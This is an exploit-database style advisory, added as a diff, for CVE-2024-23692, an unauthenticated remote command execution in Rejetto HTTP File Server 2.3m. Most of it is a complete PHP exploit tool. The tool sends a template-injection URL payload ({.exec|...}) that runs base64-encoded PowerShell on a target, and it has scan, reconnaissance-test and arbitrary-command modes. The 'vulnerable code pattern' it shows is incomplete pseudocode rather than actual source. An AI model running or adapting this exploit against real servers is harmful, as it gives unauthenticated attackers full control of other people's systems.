@@ -1,0 +1,321 @@
+=============================================================================================================================================
+| # Title     : Rejetto HTTP File Server 2.3m Unauthenticated RCE                                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : http://www.rejetto.com/hfs/                                                                                                 |
+=============================================================================================================================================
+
+[+] Summary :
+
+A critical unauthenticated remote code execution vulnerability exists in Rejetto HTTP File Server (HFS) version 2.3m that allows attackers to execute arbitrary operating system commands 
+through template injection in the search functionality. The vulnerability enables complete system compromise without authentication.
+
+[+] Technical Description
+
+The vulnerability exists in Rejetto HFS's template processing engine, specifically in the search functionality. 
+The application fails to properly sanitize user input in template expressions, allowing attackers to inject and execute arbitrary system commands through crafted template syntax.
+
+Vulnerable Code Pattern:
+
+procedure ProcessTemplate(var template: string);
+
+  cmdResult: string;
+
+  if Pos('{.exec|', template) > 0 then
+  
+    cmdResult := ExecuteCommand(ExtractCommand(template));
+    template := ReplaceTemplateCommand(template, cmdResult);
+  end;
+end;
+
+[+] Usage: 
+
+# Vulnerability Scanning
+
+php exploit.php http://target:8080 --scan
+
+# Execute a Specific Command
+
+php exploit.php http://target:8080 "whoami"
+php exploit.php http://target:8080 "ipconfig"
+
+# Test Multiple Commands
+
+php exploit.php http://target:8080 --test
+
+[+] POC :
+
+<?php
+
+
+class HFSExploit {
+    private $colors;
+    
+    public function __construct() {
+        $this->colors = [
+            'GREEN'   => "\033[1;32m",
+            'MAGENTA' => "\033[1;35m",
+            'CYAN'    => "\033[1;36m",
+            'RED'     => "\033[1;31m",
+            'BLUE'    => "\033[1;34m",
+            'YELLOW'  => "\033[1;33m",
+            'WHITE'   => "\033[1;37m",
+            'RESET'   => "\033[0m",
+            'BOLD'    => "\033[1m"
+        ];
+    }
+    
+    private function color($text, $color) {
+        return $this->colors[$color] . $text . $this->colors['RESET'];
+    }
+    
+    private function showBanner() {
+        $banner = $this->color("
+ ██╗███╗   ██╗██████╗  ██████╗ ██╗   ██╗███████╗██╗  ██╗██╗  ██╗ █████╗ 
+ ██║████╗  ██║██╔══██╗██╔═══██╗██║   ██║██╔════╝██║  ██║██║ ██╔╝██╔══██╗
+ ██║██╔██╗ ██║██   █╔╝██║   ██║██║   ██║███████╗███████║█████╔╝ ███████║
+ ██║██║╚██╗██║██╔══██╗██║   ██║██║   ██║╚════██║██╔══██║██╔═██╗ ██╔══██║
+ ██║██║ ╚████║██████╔╝╚██████╔╝╚██████╔╝███████║██║  ██║██║  ██╗██║  ██║
+ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+", 'CYAN') . 
+$this->color("
+
+", 'MAGENTA') .
+$this->color("\n        CVE-2024-23692 - Rejetto HFS Unauthenticated RCE\n", 'RED') .
+$this->color("                    @indoushka\n\n", 'WHITE');
+
+        echo $banner;
+    }
+    
+    private function encodePayload($command) {
+
+        $psCommand = "echo [S]; $command; echo [S];";
+        $utf16le = iconv('UTF-8', 'UTF-16LE', $psCommand);
+        $base64 = base64_encode($utf16le);
+        
+        return $base64;
+    }
+    
+    private function makeRequest($url) {
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'GET',
+                'timeout' => 15,
+                'ignore_errors' => true,
+                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ]
+        ]);
+        
+        $response = @file_get_contents($url, false, $context);
+        
+        if ($response === false) {
+            return ['success' => false, 'error' => 'Request failed'];
+        }
+        $statusCode = 0;
+        if (isset($http_response_header[0])) {
+            preg_match('/HTTP\/\d\.\d\s+(\d+)/', $http_response_header[0], $matches);
+            $statusCode = isset($matches[1]) ? (int)$matches[1] : 0;
+        }
+        
+        return [
+            'success' => true,
+            'status_code' => $statusCode,
+            'content' => $response
+        ];
+    }
+    
+    private function extractResult($response) {
+
+        $pattern = '/\[S\](.*?)\[S\]/s';
+        if (preg_match($pattern, $response, $matches)) {
+            return trim($matches[1]);
+        }
+
+        $lines = explode("\n", $response);
+        $inResult = false;
+        $result = [];
+        
+        foreach ($lines as $line) {
+            if (strpos($line, '[S]') !== false) {
+                if ($inResult) {
+                    break;
+                } else {
+                    $inResult = true;
+                    continue;
+                }
+            }
+            
+            if ($inResult) {
+                $result[] = $line;
+            }
+        }
+        
+        return implode("\n", $result);
+    }
+    
+    public function exploit($target, $command) {
+        $this->showBanner();
+        
+        $target = rtrim($target, '/');
+        
+        echo $this->color("[*] Target: ", 'BLUE') . $target . "\n";
+        echo $this->color("[*] Command: ", 'BLUE') . $command . "\n\n";
+        $encodedCommand = $this->encodePayload($command);
+        $payload = "/?n=%0A&cmd=cmd+/c+powershell+-enc+$encodedCommand&search=%25xxx%25url%25:%password%\}\{.exec|\{.?cmd.\}|timeout=15|out=abc.\}\{.?n.\}\{.?n.\}RESULT:\{.?n.\}\{.^abc.\}====\{.?n.\}";
+        
+        $exploitUrl = $target . $payload;
+        
+        echo $this->color("[*] Trying to exploit...", 'YELLOW') . "\n";
+        echo $this->color("[*] Exploit URL: ", 'CYAN') . $exploitUrl . "\n\n";
+        
+        $response = $this->makeRequest($exploitUrl);
+        
+        if (!$response['success']) {
+            echo $this->color("[-] Exploitation failed: " . $response['error'], 'RED') . "\n";
+            return;
+        }
+        
+        if ($response['status_code'] !== 200) {
+            echo $this->color("[-] Server returned status: " . $response['status_code'], 'RED') . "\n";
+            return;
+        }
+        
+        $result = $this->extractResult($response['content']);
+        
+        if (empty(trim($result))) {
+            echo $this->color("[-] No command output received", 'RED') . "\n";
+            echo $this->color("[*] Full response for debugging:\n", 'YELLOW');
+            echo $response['content'] . "\n";
+        } else {
+            echo $this->color("[+] Exploitation successful!", 'GREEN') . "\n";
+            echo $this->color("[+] Command output:\n", 'GREEN');
+            echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+            echo $result . "\n";
+            echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+        }
+    }
+    
+    public function testCommands($target) {
+        $this->showBanner();
+        
+        $target = rtrim($target, '/');
+        
+        echo $this->color("[*] Testing common commands on: ", 'BLUE') . $target . "\n\n";
+        
+        $testCommands = [
+            'whoami' => 'Current user',
+            'hostname' => 'System hostname',
+            'ipconfig' => 'Network configuration',
+            'systeminfo' => 'System information',
+            'dir' => 'Directory listing',
+            'net users' => 'Local users'
+        ];
+        
+        foreach ($testCommands as $cmd => $description) {
+            echo $this->color("[*] Testing: ", 'YELLOW') . $description . " (" . $cmd . ")\n";
+            
+            $encodedCommand = $this->encodePayload($cmd);
+            $payload = "/?n=%0A&cmd=cmd+/c+powershell+-enc+$encodedCommand&search=%25xxx%25url%25:%password%\}\{.exec|\{.?cmd.\}|timeout=15|out=abc.\}\{.?n.\}\{.?n.\}RESULT:\{.?n.\}\{.^abc.\}====\{.?n.\}";
+            
+            $exploitUrl = $target . $payload;
+            
+            $response = $this->makeRequest($exploitUrl);
+            
+            if ($response['success'] && $response['status_code'] === 200) {
+                $result = $this->extractResult($response['content']);
+                
+                if (!empty(trim($result))) {
+                    echo $this->color("[+] SUCCESS: " . $description, 'GREEN') . "\n";
+                    echo $this->color("[+] Output: " . trim($result), 'CYAN') . "\n";
+                } else {
+                    echo $this->color("[-] No output received", 'RED') . "\n";
+                }
+            } else {
+                echo $this->color("[-] Command failed", 'RED') . "\n";
+            }
+            echo "\n";
+        }
+    }
+    
+    public function scan($target) {
+        $this->showBanner();
+        
+        $target = rtrim($target, '/');
+        
+        echo $this->color("[*] Scanning for Rejetto HFS vulnerability: ", 'BLUE') . $target . "\n\n";
+
+        $testCommand = "echo VULNERABLE";
+        $encodedCommand = $this->encodePayload($testCommand);
+        $payload = "/?n=%0A&cmd=cmd+/c+powershell+-enc+$encodedCommand&search=%25xxx%25url%25:%password%\}\{.exec|\{.?cmd.\}|timeout=15|out=abc.\}\{.?n.\}\{.?n.\}RESULT:\{.?n.\}\{.^abc.\}====\{.?n.\}";
+        
+        $exploitUrl = $target . $payload;
+        
+        echo $this->color("[*] Sending test payload...", 'YELLOW') . "\n";
+        
+        $response = $this->makeRequest($exploitUrl);
+        
+        if ($response['success'] && $response['status_code'] === 200) {
+            $result = $this->extractResult($response['content']);
+            
+            if (strpos($result, 'VULNERABLE') !== false) {
+                echo $this->color("[+] TARGET IS VULNERABLE to CVE-2024-23692!", 'GREEN') . "\n";
+                return true;
+            } else {
+                echo $this->color("[-] Target does not appear to be vulnerable", 'RED') . "\n";
+                echo $this->color("[*] Response: " . substr($response['content'], 0, 200), 'YELLOW') . "\n";
+                return false;
+            }
+        } else {
+            echo $this->color("[-] Target not accessible or error occurred", 'RED') . "\n";
+            return false;
+        }
+    }
+}
+
+if (php_sapi_name() === 'cli') {
+    if ($argc < 2) {
+        echo "CVE-2024-23692 - Rejetto HTTP File Server RCE Exploit\n";
+        echo "Usage:\n";
+        echo "  php exploit.php <target_url> <command>\n";
+        echo "  php exploit.php <target_url> --test\n";
+        echo "  php exploit.php <target_url> --scan\n";
+        echo "\nExamples:\n";
+        echo "  php exploit.php http://target:8080 \"whoami\"\n";
+        echo "  php exploit.php http://target:8080 \"ipconfig\"\n";
+        echo "  php exploit.php http://target:8080 --test\n";
+        echo "  php exploit.php http://target:8080 --scan\n";
+        echo "\nDescription:\n";
+        echo "  Exploits unauthenticated RCE vulnerability in Rejetto HTTP File Server 2.3m\n";
+        echo "  via template injection in search parameter (CVE-2024-23692)\n";
+        exit(0);
+    }
+    
+    $target = $argv[1];
+    $command = $argv[2] ?? '--scan';
+    
+    if (!filter_var($target, FILTER_VALIDATE_URL)) {
+        echo "Error: Invalid target URL\n";
+        exit(1);
+    }
+    
+    $exploit = new HFSExploit();
+    
+    switch ($command) {
+        case '--test':
+            $exploit->testCommands($target);
+            break;
+        case '--scan':
+            $exploit->scan($target);
+            break;
+        default:
+            $exploit->exploit($target, $command);
+            break;
+    }
+} else {
+    echo "This script is intended for command line use only.\n";
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
